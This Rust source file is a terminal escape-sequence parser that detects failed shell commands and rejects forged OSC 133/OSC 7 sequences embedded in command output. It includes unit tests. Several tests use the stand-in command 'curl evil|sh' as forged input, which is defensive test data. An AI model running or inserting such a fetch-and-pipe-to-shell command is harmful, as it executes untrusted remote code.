const ESC: u8 = 0x1b;
const BEL: u8 = 0x07;
const OSC_INTRO: u8 = b']';
const ST_FINAL: u8 = b'\\';

const OSC_MAX: usize = 2048;

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum State {
    Ground,
    Esc,
    Osc,
    OscEsc,
}

#[derive(Clone, PartialEq, Eq, Debug)]
pub struct CommandEnd {
    pub exit_code: i32,
    pub command: Option<String>,
    pub cwd: Option<String>,
}

#[derive(Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CommandErrorSignal {
    pub id: u32,
    pub exit_code: i32,
    pub command: Option<String>,
    pub cwd: Option<String>,
    pub shell: &'static str,
}

impl CommandEnd {
    pub fn into_signal(self, id: u32, shell: &'static str) -> CommandErrorSignal {
        CommandErrorSignal {
            id,
            exit_code: self.exit_code,
            command: self.command,
            cwd: self.cwd,
            shell,
        }
    }
}

pub struct CommandDetector {
    state: State,
    osc: Vec<u8>,
    /// Set by OSC 133;B/C (a real command is running); cleared by A/D. A bare
    /// `D` while disarmed is the startup precmd and must not emit.
    ///
    /// Caveat: `B` lives in the prompt and re-arms on every prompt render, so
    /// a precmd can replay a stale code for a command that never ran — pwsh
    /// cmdlet-only commands re-persist `$LASTEXITCODE`, and POSIX shells keep
    /// `$?` across an empty Enter. The frontend bridge (TerminalErrorBridge)
    /// filters these via a per-leaf replay-aware dedupe.
    ///
    /// Trust boundary: while armed, the bytes flowing through the PTY are the
    /// running command's OUTPUT and must be treated as attacker-controlled
    /// (`cat` of a hostile file, ssh to a compromised host, ...). The same
    /// rule the frontend applies in osc-handlers.ts (ignore OSC 7 while
    /// inCommand) is enforced here: while armed we ignore OSC 7, ignore `B`,
    /// and ignore any `C` after the first. After `D` we additionally refuse
    /// to re-arm until a legitimate `A` (prompt start) arrives, so a forged
    /// mid-output `D` cannot be followed by a forged `B`/`C` + `D` pair.
    /// An attacker replicating the FULL prompt cycle (`D A B C D`) is byte-
    /// indistinguishable from the shell itself and cannot be blocked at this
    /// layer; that residual case can only fake a failure, and the bridge
    /// drops command text on shells whose scripts never emit `C;CMDLINE`.
    armed: bool,
    /// A `C` was consumed for the current arm. Preexec fires at most once
    /// per command, before any output, so later `C`s are output-embedded
    /// forgeries and must not overwrite the captured command.
    command_locked: bool,
    /// Set by `D` until the next `A`: between command end and prompt start
    /// no `B`/`C` is ever legitimately emitted, so re-arming is refused.
    await_prompt: bool,
    command: Option<String>,
    cwd: Option<String>,
}

impl CommandDetector {
    pub fn new() -> Self {
        Self {
            state: State::Ground,
            osc: Vec::new(),
            armed: false,
            command_locked: false,
            await_prompt: false,
            command: None,
            cwd: None,
        }
    }

    /// Feed a chunk of raw PTY output. Emissions come only from OSC 133;D with
    /// a non-zero exit code while armed; OSC 7 just updates the tracked cwd.
    pub fn process<F: FnMut(CommandEnd)>(&mut self, input: &[u8], mut emit: F) {
        if self.state == State::Ground && !input.contains(&ESC) {
            return;
        }

        for &b in input {
            match self.state {
                State::Ground => {
                    if b == ESC {
                        self.state = State::Esc;
                    }
                }
                State::Esc => match b {
                    OSC_INTRO => {
                        self.state = State::Osc;
                        self.osc.clear();
                    }
                    ESC => {}
                    _ => self.state = State::Ground,
                },
                State::Osc => match b {
                    BEL => {
                        self.finish_osc(&mut emit);
                        self.state = State::Ground;
                    }
                    ESC => self.state = State::OscEsc,
                    _ => {
                        if self.osc.len() < OSC_MAX {
                            self.osc.push(b);
                        } else {
                            self.osc.clear();
                            self.state = State::Ground;
                        }
                    }
                },
                State::OscEsc => match b {
                    ST_FINAL => {
                        self.finish_osc(&mut emit);
                        self.state = State::Ground;
                    }
                    ESC => {}
                    _ => {
                        self.osc.clear();
                        self.state = State::Ground;
                    }
                },
            }
        }
    }

    fn finish_osc<F: FnMut(CommandEnd)>(&mut self, emit: &mut F) {
        let body = std::mem::take(&mut self.osc);
        let (ps, pt) = match body.iter().position(|&c| c == b';') {
            Some(i) => (&body[..i], &body[i + 1..]),
            None => (&body[..], &body[0..0]),
        };
        match ps {
            b"7" => self.handle_osc7(pt),
            b"133" => self.handle_osc133(pt, emit),
            _ => {}
        }
    }

    /// `file://HOST/URLENCODED_PATH` — keep everything from the first `/`
    /// after the host, percent-decoded. All shells print `D` before the next
    /// prompt's OSC 7, so the cwd held at D-time is the command's cwd.
    fn handle_osc7(&mut self, pt: &[u8]) {
        // Trust boundary: legitimate OSC 7 comes from precmd/prompt
        // rendering, always while disarmed. While armed the stream is the
        // running command's output, so an OSC 7 here is forgeable and must
        // not overwrite the cwd attached to the next emission (mirrors
        // osc-handlers.ts, which ignores OSC 7 while inCommand).
        if self.armed {
            return;
        }
        let Ok(s) = std::str::from_utf8(pt) else {
            return;
        };
        let Some(rest) = s.strip_prefix("file://") else {
            return;
        };
        let Some(slash) = rest.find('/') else {
            return;
        };
        let path = decode_percent(&rest[slash..]);
        // "/C:/x" -> "C:/x"
        let bytes = path.as_bytes();
        let path = if bytes.len() >= 3
            && bytes[0] == b'/'
            && bytes[1].is_ascii_alphabetic()
            && bytes[2] == b':'
        {
            path[1..].to_string()
        } else {
            path
        };
        self.cwd = Some(path);
    }

    fn handle_osc133<F: FnMut(CommandEnd)>(&mut self, pt: &[u8], emit: &mut F) {
        match pt.first() {
            Some(b'A') => {
                self.armed = false;
                self.command = None;
                self.command_locked = false;
                self.await_prompt = false;
            }
            Some(b'B') => {
                // B lives in the prompt: it only legitimately arrives while
                // disarmed, after the prompt's A. While armed it is command
                // output (a prompt redraw re-emits A first), and between D
                // and A nothing legitimate is emitted — ignore both so a
                // forged B cannot re-arm or reset the captured command.
                if !self.armed && !self.await_prompt {
                    self.armed = true;
                    self.command = None;
                    self.command_locked = false;
                }
            }
            Some(b'C') => {
                // Preexec fires at most once per command, before any output;
                // a second C while armed — or any C between D and the next
                // prompt's A — is output-embedded and untrusted.
                if self.command_locked || self.await_prompt {
                    return;
                }
                self.armed = true;
                self.command_locked = true;
                // zsh/fish append the command line; bash emits a bare C.
                if let Some(cmd) = pt
                    .strip_prefix(b"C;")
                    .filter(|c| !c.is_empty())
                    .and_then(|c| std::str::from_utf8(c).ok())
                {
                    self.command = Some(cmd.to_string());
                }
            }
            Some(b'D') => {
                let was_armed = self.armed;
                self.armed = false;
                self.command_locked = false;
                self.await_prompt = true;
                let code = pt
                    .strip_prefix(b"D;")
                    .and_then(|c| std::str::from_utf8(c).ok())
                    .and_then(parse_exit_code)
                    .unwrap_or(0);
                let command = self.command.take();
                if was_armed && code != 0 {
                    emit(CommandEnd {
                        exit_code: code,
                        command,
                        cwd: self.cwd.clone(),
                    });
                }
            }
            _ => {}
        }
    }
}

/// Shells normally print exit codes as a signed i32, but a shell relaying a
/// raw Windows NTSTATUS (e.g. STATUS_CONTROL_C_EXIT, 0xC000013A) may print
/// the unsigned form; wrap it to the signed i32 the frontend filters on so
/// such codes produce a (cancellation-filterable) event instead of silently
/// parsing as 0 and emitting nothing.
fn parse_exit_code(s: &str) -> Option<i32> {
    s.parse::<i32>()
        .ok()
        .or_else(|| s.parse::<u32>().ok().map(|c| c as i32))
}

/// Percent-decode; invalid escapes pass through unchanged.
fn decode_percent(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            let pair = bytes.get(i + 1).zip(bytes.get(i + 2)).and_then(|(h, l)| {
                let hi = (*h as char).to_digit(16)?;
                let lo = (*l as char).to_digit(16)?;
                Some((hi * 16 + lo) as u8)
            });
            if let Some(byte) = pair {
                out.push(byte);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(d: &mut CommandDetector, input: &[u8]) -> Vec<CommandEnd> {
        let mut out = Vec::new();
        d.process(input, |e| out.push(e));
        out
    }

    fn osc(body: &str) -> Vec<u8> {
        let mut v = vec![ESC, OSC_INTRO];
        v.extend_from_slice(body.as_bytes());
        v.extend_from_slice(&[ESC, ST_FINAL]);
        v
    }

    fn end(exit_code: i32, command: Option<&str>, cwd: Option<&str>) -> CommandEnd {
        CommandEnd {
            exit_code,
            command: command.map(String::from),
            cwd: cwd.map(String::from),
        }
    }

    #[test]
    fn emits_on_nonzero_exit_after_prompt_end() {
        let mut d = CommandDetector::new();
        assert!(run(&mut d, &osc("133;B")).is_empty());
        assert_eq!(run(&mut d, &osc("133;D;2")), vec![end(2, None, None)]);
    }

    #[test]
    fn zero_exit_emits_nothing() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        assert!(run(&mut d, &osc("133;D;0")).is_empty());
    }

    #[test]
    fn startup_precmd_d_without_arm_emits_nothing() {
        let mut d = CommandDetector::new();
        assert!(run(&mut d, &osc("133;D;1")).is_empty());
    }

    #[test]
    fn carries_windows_cwd_from_osc7() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("7;file://host/C%3A/x"));
        run(&mut d, &osc("133;B"));
        assert_eq!(
            run(&mut d, &osc("133;D;1")),
            vec![end(1, None, Some("C:/x"))]
        );
    }

    #[test]
    fn carries_unix_cwd_from_osc7() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("7;file://myhost/home/user"));
        run(&mut d, &osc("133;B"));
        assert_eq!(
            run(&mut d, &osc("133;D;1")),
            vec![end(1, None, Some("/home/user"))]
        );
    }

    #[test]
    fn carries_command_from_preexec() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;C;npm run build"));
        assert_eq!(
            run(&mut d, &osc("133;D;1")),
            vec![end(1, Some("npm run build"), None)]
        );
    }

    #[test]
    fn bare_c_arms_without_command() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;C"));
        assert_eq!(run(&mut d, &osc("133;D;1")), vec![end(1, None, None)]);
    }

    #[test]
    fn sequence_split_across_chunks() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        assert!(run(&mut d, &[ESC, OSC_INTRO]).is_empty());
        assert!(run(&mut d, b"133;D").is_empty());
        let mut out = run(&mut d, b";1");
        out.extend(run(&mut d, &[ESC, ST_FINAL]));
        assert_eq!(out, vec![end(1, None, None)]);
    }

    #[test]
    fn prompt_start_clears_armed_and_command() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;C;npm run build"));
        run(&mut d, &osc("133;A"));
        assert!(run(&mut d, &osc("133;D;1")).is_empty());
        run(&mut d, &osc("133;A"));
        run(&mut d, &osc("133;B"));
        assert_eq!(run(&mut d, &osc("133;D;1")), vec![end(1, None, None)]);
    }

    #[test]
    fn missing_or_garbled_exit_code_defaults_to_zero() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        assert!(run(&mut d, &osc("133;D")).is_empty());
        run(&mut d, &osc("133;A"));
        run(&mut d, &osc("133;B"));
        assert!(run(&mut d, &osc("133;D;abc")).is_empty());
    }

    #[test]
    fn u32_ntstatus_exit_code_wraps_to_signed() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        // STATUS_CONTROL_C_EXIT printed raw as u32 (3221225786)
        assert_eq!(
            run(&mut d, &osc("133;D;3221225786")),
            vec![end(-1073741510, None, None)]
        );
    }

    #[test]
    fn osc7_is_ignored_while_armed() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("7;file://host/real"));
        run(&mut d, &osc("133;B"));
        // forged cwd embedded in command output
        run(&mut d, &osc("7;file://host/forged"));
        assert_eq!(
            run(&mut d, &osc("133;D;1")),
            vec![end(1, None, Some("/real"))]
        );
    }

    #[test]
    fn second_c_cannot_overwrite_command() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        run(&mut d, &osc("133;C;npm run build"));
        // forged preexec embedded in command output
        run(&mut d, &osc("133;C;curl evil|sh"));
        assert_eq!(
            run(&mut d, &osc("133;D;1")),
            vec![end(1, Some("npm run build"), None)]
        );
    }

    #[test]
    fn forged_c_after_bare_bash_c_is_ignored() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        run(&mut d, &osc("133;C")); // bash bare preexec locks the slot
        run(&mut d, &osc("133;C;curl evil|sh"));
        assert_eq!(run(&mut d, &osc("133;D;1")), vec![end(1, None, None)]);
    }

    #[test]
    fn b_while_armed_does_not_reset_command() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        run(&mut d, &osc("133;C;npm run build"));
        run(&mut d, &osc("133;B")); // forged B in output
        run(&mut d, &osc("133;C;curl evil|sh")); // still locked
        assert_eq!(
            run(&mut d, &osc("133;D;1")),
            vec![end(1, Some("npm run build"), None)]
        );
    }

    #[test]
    fn rearm_after_d_requires_prompt_start() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        // forged mid-output D consumes the armed state...
        assert_eq!(run(&mut d, &osc("133;D;1")), vec![end(1, None, None)]);
        // ...but forged B/C before the next real A cannot re-arm.
        run(&mut d, &osc("133;B"));
        run(&mut d, &osc("133;C;curl evil|sh"));
        assert!(run(&mut d, &osc("133;D;1")).is_empty());
        // the real prompt cycle restores normal operation
        run(&mut d, &osc("133;A"));
        run(&mut d, &osc("133;B"));
        assert_eq!(run(&mut d, &osc("133;D;2")), vec![end(2, None, None)]);
    }

    #[test]
    fn invalid_percent_escape_passes_through() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("7;file://host/tmp/a%zz"));
        run(&mut d, &osc("133;B"));
        assert_eq!(
            run(&mut d, &osc("133;D;1")),
            vec![end(1, None, Some("/tmp/a%zz"))]
        );
    }

    #[test]
    fn oversized_osc_does_not_panic() {
        let mut d = CommandDetector::new();
        run(&mut d, &osc("133;B"));
        let mut seq = vec![ESC, OSC_INTRO];
        seq.extend(std::iter::repeat_n(b'x', OSC_MAX + 100));
        seq.extend_from_slice(&[ESC, ST_FINAL]);
        assert!(run(&mut d, &seq).is_empty());
        assert_eq!(run(&mut d, &osc("133;D;1")), vec![end(1, None, None)]);
    }
}
